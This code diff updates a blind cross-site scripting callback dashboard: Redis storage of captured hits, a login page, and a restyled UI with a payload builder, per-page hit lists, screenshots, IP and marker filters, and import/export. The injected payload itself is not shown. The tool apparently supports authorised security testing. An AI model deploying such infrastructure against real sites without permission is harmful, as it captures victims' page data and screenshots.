+      for (const item of page) {
+        items.push(...normalizeStoredItem(item));
+      }
+      if (page.length < PAGE) {
+        break;
+      }
+      start += PAGE;
+    }
+
+    if (items.length) {
+      fs.writeFileSync(logFile, items.join("\n") + "\n", "utf8");
+      console.log(`Restored ${items.length} callbacks from Upstash Redis`);
+    }
+  } catch (error) {
+    console.error("Upstash restore failed:", error.message);
+  }
+}
+
+async function redisAppend(entry) {
+  if (!redisEnabled) {
+    return;
+  }
+
+  try {
+    await redisRequest(["RPUSH", redisKey, JSON.stringify(entry)]);
+  } catch (error) {
+    console.error("Upstash append failed:", error.message);
+  }
+}
+
+async function redisAppendMany(entries) {
+  if (!redisEnabled || !entries.length) {
+    return;
+  }
+
+  // Batch by size rather than count so large screenshot hits stay under the cap.
+  const MAX_BATCH_BYTES = 4 * 1024 * 1024;
+  let batch = [];
+  let batchBytes = 0;
+  let failed = false;
+
+  const flush = async () => {
+    if (!batch.length) {
+      return;
+    }
+    try {
+      await redisPipeline(batch);
+    } catch (error) {
+      failed = true;
+      console.error("Upstash bulk append failed:", error.message);
+    } finally {
+      batch = [];
+      batchBytes = 0;
+    }
+  };
+
+  for (const entry of entries) {
+    if (failed) {
+      return;
+    }
+    const json = JSON.stringify(entry);
+    if (batch.length && batchBytes + json.length > MAX_BATCH_BYTES) {
+      await flush();
+    }
+    batch.push(["RPUSH", redisKey, json]);
+    batchBytes += json.length;
+  }
+
+  await flush();
+}
+
+async function redisClear() {
+  if (!redisEnabled) {
+    return;
+  }
+
+  try {
+    await redisRequest(["DEL", redisKey]);
+  } catch (error) {
+    console.error("Upstash clear failed:", error.message);
+  }
+}
+
+async function redisReplace(entries) {
+  if (!redisEnabled) {
+    return;
+  }
+
+  await redisClear();
+  await redisAppendMany(entries);
+}
+
+function buildLoginPage(hasError = false, message = "Invalid password.", next = "/dashboard") {
   return `<!doctype html>
 <html lang="en">
 <head>
@@ -672,6 +1363,7 @@ function buildLoginPage(hasError = false, message = "Invalid password.") {
 </head>
 <body>
   <form method="post" action="/login" autocomplete="off">
+    <input type="hidden" name="next" value="${escapeHtml(next)}">
     <h1>Blind XSS Dashboard</h1>
     <p>Enter the dashboard password to continue.</p>
     ${hasError ? `<div class="error">${escapeHtml(message)}</div>` : ""}
@@ -697,500 +1389,354 @@ function buildDashboard(baseUrl) {
   <style>
     :root {
       color-scheme: dark;
-      --bg: #101214;
-      --panel: #171b1f;
-      --panel-2: #20262b;
-      --text: #edf2f7;
-      --muted: #9aa7b2;
-      --line: #303941;
-      --accent: #20c997;
-      --warn: #f7b955;
-      --danger: #ff6b6b;
+      --bg: #0b0e11;
+      --bg-2: #0f1418;
+      --panel: #141a20;
+      --panel-2: #1a222a;
+      --line: #263039;
+      --line-2: #33414d;
+      --text: #e9eff5;
+      --muted: #93a2af;
+      --accent: #2ee6a6;
+      --accent-soft: rgba(46, 230, 166, 0.12);
+      --blue: #62b6ff;
+      --warn: #f6c453;
+      --warn-soft: rgba(246, 196, 83, 0.12);
+      --danger: #ff7a8a;
+      --danger-soft: rgba(255, 122, 138, 0.12);
+      --radius: 12px;
     }
-
     * { box-sizing: border-box; }
-
+    [hidden] { display: none !important; }
+    html, body { min-height: 100%; }
     body {
       margin: 0;
-      background: var(--bg);
+      background:
+        radial-gradient(900px 520px at 12% -12%, rgba(46, 230, 166, 0.10), transparent 60%),
+        radial-gradient(900px 520px at 100% 0%, rgba(98, 182, 255, 0.08), transparent 55%),
+        var(--bg);
       color: var(--text);
-      font: 14px/1.5 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      font: 14px/1.55 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     }
+    a { color: var(--blue); }
+    button, input { font: inherit; }
+    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
 
-    header {
+    .topbar {
+      position: sticky; top: 0; z-index: 60;
+      display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between;
+      gap: 14px; padding: 14px 24px;
+      background: rgba(11, 14, 17, 0.85);
+      backdrop-filter: blur(10px);
       border-bottom: 1px solid var(--line);
-      background: #15191d;
-      padding: 18px 24px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 18px;
     }
-
-    h1 {
-      margin: 0;
-      font-size: 20px;
-      font-weight: 650;
+    .brand { display: flex; align-items: center; gap: 12px; min-width: 0; }
+    .logo {
+      width: 38px; height: 38px; flex: none;
+      display: grid; place-items: center;
+      border-radius: 10px;
+      background: linear-gradient(145deg, var(--accent), #0e9f74);
+      color: #05231a; font-size: 20px; font-weight: 800;
+      box-shadow: 0 6px 18px rgba(46, 230, 166, 0.25);
     }
+    .brand h1 { margin: 0; font-size: 17px; font-weight: 700; letter-spacing: 0.01em; }
+    .brand .sub { color: var(--muted); font-size: 12px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .brand .sub .mono { color: var(--text); }
+    .topbar-actions { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; }
+    .topbar-actions form { margin: 0; }
 
-    main {
-      padding: 24px;
-      display: grid;
-      gap: 18px;
+    .btn {
+      display: inline-flex; align-items: center; justify-content: center; gap: 6px;
+      min-height: 36px; padding: 7px 13px;
+      border: 1px solid var(--line-2); border-radius: 9px;
+      background: var(--panel-2); color: var(--text);
+      cursor: pointer; white-space: nowrap;
+      transition: border-color 0.15s ease, background 0.15s ease, transform 0.05s ease;
     }
+    .btn:hover { border-color: var(--accent); background: #1f2830; }
+    .btn:active { transform: translateY(1px); }
+    .btn.ghost { background: transparent; }
+    .btn.danger { color: var(--danger); border-color: rgba(255, 122, 138, 0.35); }
+    .btn.danger:hover { background: var(--danger-soft); border-color: var(--danger); }
+    .btn.primary { background: var(--accent); border-color: var(--accent); color: #04241a; font-weight: 650; }
+    .btn.primary:hover { background: #4bebba; }
 
-    .top {
-      display: grid;
-      grid-template-columns: minmax(280px, 1fr) 340px;
-      gap: 18px;
+    .pill {
+      display: inline-flex; align-items: center; gap: 6px;
+      min-height: 30px; padding: 3px 10px;
+      border: 1px solid var(--line); border-radius: 999px;
+      background: var(--panel); color: var(--muted);
+      font-size: 12px; white-space: nowrap;
     }
+    .pill.subtle { background: transparent; }
+    .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 0 3px var(--accent-soft); }
+    .toggle { display: inline-flex; align-items: center; gap: 7px; color: var(--muted); font-size: 12px; cursor: pointer; user-select: none; }
+    .toggle input { accent-color: var(--accent); margin: 0; }
 
-    .split {
-      display: grid;
-      grid-template-columns: minmax(0, 1fr) minmax(0, 1fr);
-      gap: 18px;
-      align-items: stretch;
+    .wrap { width: 100%; max-width: none; padding: 20px 28px 40px; display: grid; gap: 16px; }
+    .stats-row { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; }
+    .stat {
+      display: flex; align-items: baseline; gap: 10px; padding: 14px 16px;
+      background: linear-gradient(180deg, var(--panel), var(--bg-2));
+      border: 1px solid var(--line); border-radius: var(--radius);
     }
+    .stat strong { font-size: 26px; line-height: 1; font-weight: 750; }
+    .stat span { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.08em; }
 
-    .split .panel {
-      height: 100%;
+    .panel { background: var(--panel); border: 1px solid var(--line); border-radius: var(--radius); overflow: hidden; }
+    .panel-head {
+      display: flex; align-items: center; justify-content: space-between; gap: 12px;
+      padding: 14px 16px; border-bottom: 1px solid var(--line);
+      background: rgba(255, 255, 255, 0.015);
     }
+    .panel-head h2 { margin: 0; font-size: 14px; font-weight: 700; }
+    .hint { margin: 2px 0 0; color: var(--muted); font-size: 12px; }
 
-    .panel {
-      background: var(--panel);
-      border: 1px solid var(--line);
-      border-radius: 8px;
-      overflow: visible;
+    .builder-head {
+      display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between;
+      gap: 12px; padding: 14px 16px 0;
     }
-
-    .panel-header {
-      padding: 14px 16px;
-      border-bottom: 1px solid var(--line);
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 12px;
-    }
-
-    .panel-header h2 {
-      margin: 0;
-      font-size: 14px;
-      font-weight: 650;
-    }
-
-    .panel-body {
-      padding: 16px;
-    }
-
-    .payload-row {
-      display: grid;
-      grid-template-columns: 1fr auto;
-      gap: 8px;
-      margin-top: 10px;
-    }
-
-    input, button {
-      border: 1px solid var(--line);
-      background: var(--panel-2);
-      color: var(--text);
-      border-radius: 6px;
-      font: inherit;
-      min-height: 38px;
+    .builder-head h2 { margin: 0; font-size: 14px; font-weight: 700; }
+    .builder-inputs { display: flex; gap: 8px; align-items: center; }
+    .builder-inputs input { width: 240px; }
+    .builder code {
+      display: block; margin: 12px 16px 16px; padding: 12px 14px;
+      border: 1px solid var(--line); border-radius: 9px;
+      background: #0a0e11; color: #cde7dc;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 12px; overflow-x: auto; white-space: nowrap;
     }
 
     input {
-      width: 100%;
-      padding: 8px 10px;
-      min-width: 0;
+      width: 100%; min-height: 36px; padding: 7px 11px;
+      border: 1px solid var(--line-2); border-radius: 9px;
+      background: var(--panel-2); color: var(--text); min-width: 0;
     }
+    input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-soft); }
+    input::placeholder { color: #6d7d8a; }
+    input[type="checkbox"] { width: auto; min-height: auto; }
+    input[type="file"] { padding: 6px 8px; font-size: 12px; }
 
-    button {
-      cursor: pointer;
-      padding: 8px 12px;
+    .workspace { display: grid; grid-template-columns: clamp(260px, 18vw, 360px) minmax(0, 1fr); gap: 16px; align-items: start; }
+    .pages-panel { position: sticky; top: 84px; display: flex; flex-direction: column; max-height: calc(100vh - 104px); }
+    .pages-panel .groups { overflow-y: auto; }
+    .groups { display: grid; gap: 8px; padding: 10px; }
+
+    .group-card {
+      display: grid; gap: 3px; width: 100%;
+      padding: 10px 12px; border: 1px solid var(--line); border-radius: 10px;
+      background: var(--panel-2); color: inherit;
+      font: inherit; text-align: left; cursor: pointer;
+      transition: border-color 0.15s ease, background 0.15s ease;
     }
+    .group-card:hover { border-color: var(--line-2); }
+    .group-card.active { border-color: var(--accent); background: linear-gradient(90deg, var(--accent-soft), var(--panel-2) 60%); }
+    .group-title { font-weight: 650; font-size: 13px; overflow-wrap: anywhere; }
+    .group-meta { color: var(--muted); font-size: 11px; }
+    .group-card:hover .group-title { color: var(--accent); }
 
-    button:hover {
-      border-color: var(--accent);
-    }
 
-    .ghost {
-      background: transparent;
-    }
 
-    .danger {
-      color: var(--danger);
-    }
 
-    .header-actions {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .header-actions form {
-      margin: 0;
-    }
-
-    code {
-      display: block;
-      overflow-x: auto;
-      padding: 12px;
-      border-radius: 6px;
-      background: #0b0d0f;
-      border: 1px solid var(--line);
-      white-space: nowrap;
-    }
-
-    .stats {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 10px;
-    }
-
-    .stat {
-      background: var(--panel-2);
-      border: 1px solid var(--line);
-      border-radius: 8px;
-      padding: 12px;
-    }
-
-    .stat strong {
-      display: block;
-      font-size: 24px;
-      line-height: 1.1;
-    }
-
-    .stat span {
-      color: var(--muted);
-      font-size: 12px;
-    }
-
-    .status {
-      color: var(--muted);
-      font-size: 12px;
-    }
-
+    .hits-panel { display: flex; flex-direction: column; }
+    .hits-head { gap: 10px; }
+    .hits-actions { display: flex; flex-wrap: wrap; gap: 8px; justify-content: flex-end; }
     .filters {
-      display: grid;
-      grid-template-columns: repeat(3, minmax(0, 1fr));
-      gap: 10px;
+      display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)) auto; gap: 8px;
+      padding: 10px 12px; border-bottom: 1px solid var(--line);
+      background: rgba(255, 255, 255, 0.01);
     }
+    .filters input { min-height: 34px; font-size: 13px; }
+    .hits { display: grid; gap: 10px; padding: 12px; }
 
-    .import-row {
-      display: grid;
-      grid-template-columns: minmax(0, 1fr) auto;
-      gap: 10px;
-      align-items: center;
+    .hit { border: 1px solid var(--line); border-radius: 10px; background: var(--panel-2); overflow: hidden; transition: border-color 0.15s ease; }
+    .hit:hover { border-color: var(--line-2); }
+    .hit.open { border-color: var(--accent); }
+    .hit-summary {
+      width: 100%; display: grid; grid-template-columns: minmax(0, 1fr) auto;
+      align-items: center; gap: 12px; padding: 12px 14px; cursor: pointer; min-height: 0;
     }
+    .hit-summary:hover { background: rgba(255, 255, 255, 0.02); }
+    .hit-summary:focus-visible { outline: 2px solid var(--accent); outline-offset: -2px; }
+    .hit-main { min-width: 0; display: grid; gap: 4px; }
+    .hit-badges { display: flex; flex-wrap: wrap; align-items: center; gap: 6px; }
+    .badge {
+      font-size: 11px; padding: 1px 8px;
+      border: 1px solid var(--line); border-radius: 999px;
+      color: var(--muted); background: #10161b;
+    }
+    .badge.exec { color: var(--accent); border-color: rgba(46, 230, 166, 0.35); background: var(--accent-soft); }
+    .badge.fetch { color: var(--warn); border-color: rgba(246, 196, 83, 0.35); background: var(--warn-soft); }
+    .marker { color: var(--accent); font-weight: 700; font-size: 13px; }
+    .hit-title { font-weight: 600; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .hit-url { color: var(--muted); font-size: 12px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .hit-url a { color: var(--blue); text-decoration: none; }
+    .hit-url a:hover { text-decoration: underline; }
+    .hit-side { display: grid; justify-items: end; gap: 2px; color: var(--muted); font-size: 12px; white-space: nowrap; }
+    .hit-time { color: var(--text); font-size: 12px; }
+    .hit-ip { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 11px; }
+    .chevron { color: var(--muted); font-size: 15px; line-height: 1; transition: transform 0.15s ease; }
+    .hit.open .chevron { transform: rotate(180deg); color: var(--accent); }
 
+    .hit-detail { display: none; padding: 14px; border-top: 1px solid var(--line); background: rgba(0, 0, 0, 0.15); }
+    .hit.open .hit-detail { display: block; }
+    .shot { display: flex; justify-content: center; margin-bottom: 12px; }
+    .shot img { display: block; max-width: 100%; max-height: 72vh; width: auto; height: auto; border-radius: 9px; border: 1px solid var(--line-2); background: #000; }
+    .detail-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 10px; }
+    .detail-card { padding: 10px 12px; border: 1px solid var(--line); border-radius: 9px; background: #0e1418; }
+    .detail-card h4 {
+      margin: 0 0 7px; font-size: 11px; font-weight: 700;
+      letter-spacing: 0.06em; text-transform: uppercase; color: var(--muted);
+    }
+    .detail-card pre {
+      margin: 0; max-height: 220px; overflow: auto;
+      white-space: pre-wrap; word-break: break-word; font-size: 12px; color: #d6e2ea;
+    }
+    .meta { margin-top: 12px; border-top: 1px dashed var(--line); padding-top: 10px; }
+    .meta summary { cursor: pointer; color: var(--muted); font-size: 12px; user-select: none; }
+    .meta summary:hover { color: var(--text); }
+    .meta dl { margin: 10px 0 0; display: grid; grid-template-columns: 120px minmax(0, 1fr); gap: 6px 14px; font-size: 12px; }
+    .meta dt { color: var(--muted); }
+    .meta dd { margin: 0; overflow-wrap: anywhere; }
+
+    .empty { padding: 30px 18px; text-align: center; color: var(--muted); }
+    .empty.small { padding: 12px; font-size: 12px; }
     .modal-overlay {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.6);
-      z-index: 2000;
-      align-items: center;
-      justify-content: center;
+      display: none; position: fixed; inset: 0; z-index: 2000;
+      align-items: center; justify-content: center; padding: 16px;
+      background: rgba(4, 7, 9, 0.72); backdrop-filter: blur(3px);
     }
     .modal-overlay.open { display: flex; }
     .modal {
-      background: var(--panel);
-      border: 1px solid var(--line);
-      border-radius: 10px;
-      width: min(520px, 95vw);
-      box-shadow: 0 24px 48px rgba(0,0,0,0.5);
-      overflow: hidden;
+      width: min(520px, 100%); background: var(--panel);
+      border: 1px solid var(--line-2); border-radius: 14px;
+      box-shadow: 0 30px 70px rgba(0, 0, 0, 0.6); overflow: hidden;
     }
     .modal-header {
-      padding: 14px 16px;
-      border-bottom: 1px solid var(--line);
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
+      display: flex; align-items: center; justify-content: space-between; gap: 10px;
+      padding: 14px 16px; border-bottom: 1px solid var(--line);
     }
-    .modal-header h2 { margin: 0; font-size: 14px; font-weight: 650; }
-    .modal-body { padding: 16px; display: grid; gap: 12px; }
+    .modal-header h2 { margin: 0; font-size: 14px; }
+    .modal-body { display: grid; gap: 12px; padding: 16px; }
     .modal-close {
-      background: transparent;
-      border: 0;
-      color: var(--muted);
-      font-size: 20px;
-      line-height: 1;
-      min-height: auto;
-      padding: 2px 6px;
-      cursor: pointer;
+      width: 32px; min-height: 32px; padding: 0; border: 0; border-radius: 8px;
+      background: transparent; color: var(--muted); font-size: 18px; cursor: pointer;
     }
-    .modal-close:hover { color: var(--text); border-color: transparent; }
+    .modal-close:hover { background: var(--panel-2); color: var(--text); }
+    .import-row { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 10px; align-items: center; }
 
-    .groups {
-      display: grid;
-      gap: 10px;
-      padding: 12px;
-      overflow: visible;
+    @media (max-width: 960px) {
+      .workspace { grid-template-columns: 1fr; }
+      .pages-panel { position: static; max-height: none; }
+      .pages-panel .groups { max-height: 300px; }
     }
-
-    .group-card {
-      position: relative;
-      z-index: 1;
-      width: 100%;
-      display: grid;
-      grid-template-columns: minmax(0, 1fr) auto auto;
-      gap: 10px;
-      align-items: center;
-      padding: 12px;
-      background: var(--panel-2);
-      border: 1px solid var(--line);
-      border-radius: 8px;
-    }
-
-    .group-card.active {
-      border-color: var(--accent);
-    }
-
-    .group-card.menu-active {
-      z-index: 500;
-    }
-
-    .group-main {
-      min-height: auto;
-      padding: 0;
-      border: 0;
-      background: transparent;
-      text-align: left;
-    }
-
-    .group-title {
-      font-weight: 650;
-      overflow-wrap: anywhere;
-    }
-
-    .group-meta {
-      display: block;
-      color: var(--muted);
-      font-size: 12px;
-      margin-top: 3px;
-    }
-
-    .hit-count {
-      color: var(--accent);
-      font-size: 20px;
-      font-weight: 750;
-      white-space: nowrap;
-    }
-
-    .icon-button {
-      width: 36px;
-      min-height: 36px;
-      padding: 0;
-      font-size: 20px;
-      line-height: 1;
-    }
-
-    .menu {
-      position: absolute;
-      right: 10px;
-      top: 48px;
-      z-index: 1000;
-      min-width: 150px;
-      display: none;
-      padding: 6px;
-      background: #111519;
-      border: 1px solid var(--line);
-      border-radius: 8px;
-      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
-    }
-
-    .menu.align-up {
-      top: auto;
-      bottom: 48px;
-    }
-
-    .menu.open {
-      display: grid;
-      gap: 4px;
-    }
-
-    .menu button {
-      min-height: 34px;
-      text-align: left;
-      background: transparent;
-      border: 0;
-      padding: 7px 9px;
-    }
-
-    .menu button:hover {
-      background: var(--panel-2);
-    }
-
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      table-layout: fixed;
-    }
-
-    th, td {
-      border-bottom: 1px solid var(--line);
-      padding: 10px 12px;
-      text-align: left;
-      vertical-align: top;
-    }
-
-    th {
-      color: var(--muted);
-      font-size: 12px;
-      font-weight: 650;
-      background: #14181b;
-    }
-
-    td {
-      overflow-wrap: anywhere;
-    }
-
-    .marker {
-      color: var(--accent);
-      font-weight: 650;
-    }
-
-    .muted {
-      color: var(--muted);
-    }
-
-    .empty {
-      padding: 28px;
-      color: var(--muted);
-      text-align: center;
-    }
-
-    .pill {
-      display: inline-flex;
-      align-items: center;
-      min-height: 26px;
-      padding: 3px 8px;
-      border: 1px solid var(--line);
-      border-radius: 999px;
-      color: var(--muted);
-      background: var(--panel-2);
-      font-size: 12px;
-    }
-
-    @media (max-width: 860px) {
-      header { align-items: flex-start; flex-direction: column; }
-      main { padding: 14px; }
-      .top { grid-template-columns: 1fr; }
-      .split { grid-template-columns: 1fr; }
+    @media (max-width: 720px) {
+      .topbar { padding: 12px 14px; }
+      .wrap { padding: 14px 14px 30px; }
+      .stats-row { gap: 8px; }
+      .stat { padding: 10px 12px; flex-direction: column; align-items: flex-start; gap: 2px; }
+      .stat strong { font-size: 20px; }
+      .builder-inputs { width: 100%; }
+      .builder-inputs input { width: 100%; }
       .filters { grid-template-columns: 1fr; }
-      .payload-row { grid-template-columns: 1fr; }
-      th:nth-child(4), td:nth-child(4), th:nth-child(5), td:nth-child(5) { display: none; }
-      th:nth-child(6), td:nth-child(6) { max-width: 160px; }
+      .hit-title, .hit-url { white-space: normal; }
+      .meta dl { grid-template-columns: 90px minmax(0, 1fr); }
     }
   </style>
 </head>
 <body>
-  <header>
-    <div>
-      <h1>Blind XSS Dashboard</h1>
-      <div class="status">Serving payloads from <span id="base-url">${escapeHtml(baseUrl)}</span></div>
+  <header class="topbar">
+    <div class="brand">
+      <span class="logo" aria-hidden="true">◈</span>
+      <div>
+        <h1>Blind XSS</h1>
+        <div class="sub">Serving from <span class="mono" id="base-url">${escapeHtml(baseUrl)}</span></div>
+      </div>
     </div>
-    <div class="header-actions">
-      <span class="pill" id="last-refresh">Waiting for callbacks</span>
-      <button class="ghost" id="open-filters">⚙ Filter</button>
-      <button class="ghost" id="open-import">⬆ Import / Export</button>
-      <form method="post" action="/logout">
-        <button class="ghost" type="submit">Logout</button>
-      </form>
+    <div class="topbar-actions">
+      <span class="pill"><span class="dot" aria-hidden="true"></span><span id="last-refresh">Connecting…</span></span>
+      <label class="toggle" title="Show payload-load/image hits (script fetched but not executed)">
+        <input type="checkbox" id="show-fetch" checked>
+        <span>Fetch-only</span>
+      </label>
+      <button class="btn ghost" id="refresh" type="button">Refresh</button>
+      <button class="btn ghost" id="open-import" type="button">Import / Export</button>
+      <form method="post" action="/logout"><button class="btn ghost" type="submit">Logout</button></form>
     </div>
   </header>
 
-  <main>
-    <section class="top">
-      <div class="panel">
-        <div class="panel-header">
-          <h2>Payload Builder</h2>
-        </div>
-        <div class="panel-body">
-          <label for="marker">Unique marker</label>
-          <div class="payload-row">
-            <input id="marker" value="blind-xss" spellcheck="false">
-            <button id="copy">Copy payload</button>
-          </div>
-          <p class="muted">Use a different marker for each test location so the callback tells you where it came from.</p>
-          <code id="payload">${escapeHtml(samplePayload)}</code>
-        </div>
-      </div>
-
-      <div class="panel">
-        <div class="panel-header">
-          <h2>Summary</h2>
-        </div>
-        <div class="panel-body stats">
-          <div class="stat">
-            <strong id="total">0</strong>
-            <span>Total hits</span>
-          </div>
-          <div class="stat">
-            <strong id="unique">0</strong>
-            <span>Unique markers</span>
-          </div>
-        </div>
-      </div>
+  <main class="wrap">
+    <section class="stats-row" aria-label="Summary">
+      <div class="stat"><strong id="total">0</strong><span>hits</span></div>
+      <div class="stat"><strong id="unique">0</strong><span>markers</span></div>
+      <div class="stat"><strong id="pages-count">0</strong><span>pages</span></div>
     </section>
 
-    <!-- Filter Modal -->
-    <div class="modal-overlay" id="modal-filters">
-      <div class="modal">
-        <div class="modal-header">
-          <h2>Filters</h2>
-          <div style="display:flex;gap:8px;align-items:center">
-            <button id="clear-filters">Clear</button>
-            <button class="modal-close" id="close-filters">✕</button>
-          </div>
+    <section class="panel builder">
+      <div class="builder-head">
+        <div>
+          <h2>Payload</h2>
+          <p class="hint">Use a unique marker for each injection point.</p>
         </div>
-        <div class="modal-body filters">
-          <input id="filter-page" placeholder="Filter page URL or site" list="page-suggestions">
-          <datalist id="page-suggestions"></datalist>
-          <input id="filter-ip" placeholder="Filter IP" list="ip-suggestions">
-          <datalist id="ip-suggestions"></datalist>
-          <input id="filter-marker" placeholder="Filter marker" list="marker-suggestions">
-          <datalist id="marker-suggestions"></datalist>
+        <div class="builder-inputs">
+          <input id="marker" value="blind-xss" spellcheck="false" aria-label="Unique marker">
+          <button class="btn primary" id="copy" type="button">Copy</button>
         </div>
       </div>
+      <code id="payload">${escapeHtml(samplePayload)}</code>
+    </section>
+
+    <div class="workspace">
+      <aside class="panel pages-panel">
+        <div class="panel-head">
+          <h2>Pages</h2>
+          <span class="pill subtle" id="pages-meta">0</span>
+        </div>
+        <div id="groups" class="groups"></div>
+      </aside>
+
+      <section class="panel hits-panel">
+        <div class="panel-head hits-head">
+          <div>
+            <h2 id="details-title">Hits</h2>
+            <p class="hint" id="details-sub">No hits yet.</p>
+          </div>
+          <div class="hits-actions">
+            <button class="btn ghost" id="page-copy" type="button" hidden>Copy URL</button>
+            <button class="btn danger" id="page-delete" type="button" hidden>Delete page</button>
+            <button class="btn danger" id="clear-all" type="button">Clear all</button>
+          </div>
+        </div>
+        <div class="filters">
+          <input id="filter-page" placeholder="Filter page URL" list="page-suggestions" aria-label="Filter page URL">
+          <input id="filter-ip" placeholder="Filter IP" list="ip-suggestions" aria-label="Filter IP">
+          <input id="filter-marker" placeholder="Filter marker" list="marker-suggestions" aria-label="Filter marker">
+          <button class="btn ghost" id="clear-filters" type="button">Reset</button>
+        </div>
+        <div id="callbacks" class="hits"></div>
+      </section>
     </div>
 
-    <!-- Import / Export Modal -->
+    <datalist id="page-suggestions"></datalist>
+    <datalist id="ip-suggestions"></datalist>
+    <datalist id="marker-suggestions"></datalist>
+
     <div class="modal-overlay" id="modal-import">
       <div class="modal">
         <div class="modal-header">
           <h2>Import / Export</h2>
-          <button class="modal-close" id="close-import">✕</button>
+          <button class="modal-close" id="close-import" type="button" aria-label="Close">✕</button>
         </div>
         <div class="modal-body">
-          <button id="download-hits">Download hits</button>
+          <button class="btn" id="download-hits" type="button">Download hits</button>
           <div class="import-row">
             <input id="import-file" type="file" accept=".jsonl,.json,application/json,application/x-ndjson">
-            <button id="append-import">Add to logs</button>
+            <button class="btn" id="append-import" type="button">Add to logs</button>
           </div>
-          <div id="import-preview" class="muted empty">No import file selected.</div>
+          <div id="import-preview" class="hint">No import file selected.</div>
         </div>
       </div>
     </div>
-
-    <section class="panel">
-      <div class="panel-header">
-        <h2>Pages</h2>
-        <div class="header-actions">
-          <button id="refresh">Refresh</button>
-          <button id="clear-all" class="danger">Clear all</button>
-        </div>
-      </div>
-      <div id="groups" class="groups"></div>
-    </section>
-
-    <section class="panel">
-      <div class="panel-header">
-        <h2 id="details-title">Hit Details</h2>
-      </div>
-      <div id="callbacks"></div>
-    </section>
   </main>
 
   <script>
@@ -1200,6 +1746,8 @@ function buildDashboard(baseUrl) {
     const groupsEl = document.querySelector("#groups");
     const callbacksEl = document.querySelector("#callbacks");
     const detailsTitleEl = document.querySelector("#details-title");
+    const detailsSubEl = document.querySelector("#details-sub");
+    const pagesMetaEl = document.querySelector("#pages-meta");
     const pageSuggestionsEl = document.querySelector("#page-suggestions");
     const ipSuggestionsEl = document.querySelector("#ip-suggestions");
     const markerSuggestionsEl = document.querySelector("#marker-suggestions");
@@ -1207,6 +1755,7 @@ function buildDashboard(baseUrl) {
     const importPreviewEl = document.querySelector("#import-preview");
     const totalEl = document.querySelector("#total");
     const uniqueEl = document.querySelector("#unique");
+    const pagesCountEl = document.querySelector("#pages-count");
     const refreshEl = document.querySelector("#last-refresh");
     const filters = {
       page: document.querySelector("#filter-page"),
@@ -1215,8 +1764,11 @@ function buildDashboard(baseUrl) {
     };
     let allCallbacks = [];
     let activeGroupKey = "";
-    let cutPageKey = "";
     let importPreviewEntries = [];
+    let showFetch = true;
+    const expandedHits = new Set();
+    let hitIndex = new Map();
+    let lastSignature = "";
 
     function payloadForMarker(marker) {
       const clean = marker.replace(/^\\/+/, "").trim() || "blind-xss";
@@ -1234,6 +1786,11 @@ function buildDashboard(baseUrl) {
       await navigator.clipboard.writeText(payloadCode.textContent);
     });
     document.querySelector("#refresh").addEventListener("click", loadCallbacks);
+    document.querySelector("#show-fetch").addEventListener("change", (event) => {
+      showFetch = event.target.checked;
+      activeGroupKey = "";
+      renderCallbacks(allCallbacks);
+    });
     document.querySelector("#download-hits").addEventListener("click", () => {
       location.href = "/api/callbacks/download";
     });
@@ -1250,6 +1807,7 @@ function buildDashboard(baseUrl) {
       const data = await postJson("/api/callbacks/clear", {});
       allCallbacks = data.callbacks || [];
       activeGroupKey = "";
+      expandedHits.clear();
       renderCallbacks(allCallbacks);
       updateSuggestions(allCallbacks);
     });
@@ -1263,22 +1821,35 @@ function buildDashboard(baseUrl) {
     Object.values(filters).forEach((input) => {
       input.addEventListener("input", () => renderCallbacks(allCallbacks));
     });
-    document.addEventListener("click", (event) => {
-      if (!event.target.closest(".group-card")) {
-        closeMenus();
+    document.querySelector("#page-copy").addEventListener("click", async () => {
+      if (activeGroupKey) {
+        await navigator.clipboard.writeText(activeGroupKey);
       }
     });
+    document.querySelector("#page-delete").addEventListener("click", async () => {
+      if (!activeGroupKey || !confirm("Delete all hits for this page URL?")) {
+        return;
+      }
 
-    // Modal open/close
+      const data = await postJson("/api/callbacks/delete-page", { pageKey: activeGroupKey });
+      allCallbacks = data.callbacks || [];
+      activeGroupKey = "";
+      expandedHits.clear();
+      renderCallbacks(allCallbacks);
+      updateSuggestions(allCallbacks);
+    });
+
+
     function openModal(id) { document.getElementById(id).classList.add("open"); }
     function closeModal(id) { document.getElementById(id).classList.remove("open"); }
-    document.querySelector("#open-filters").addEventListener("click", () => openModal("modal-filters"));
-    document.querySelector("#close-filters").addEventListener("click", () => closeModal("modal-filters"));
-    document.querySelector("#modal-filters").addEventListener("click", (e) => { if (e.target === e.currentTarget) closeModal("modal-filters"); });
     document.querySelector("#open-import").addEventListener("click", () => openModal("modal-import"));
     document.querySelector("#close-import").addEventListener("click", () => closeModal("modal-import"));
-    document.querySelector("#modal-import").addEventListener("click", (e) => { if (e.target === e.currentTarget) closeModal("modal-import"); });
-    document.addEventListener("keydown", (e) => { if (e.key === "Escape") { closeModal("modal-filters"); closeModal("modal-import"); } });
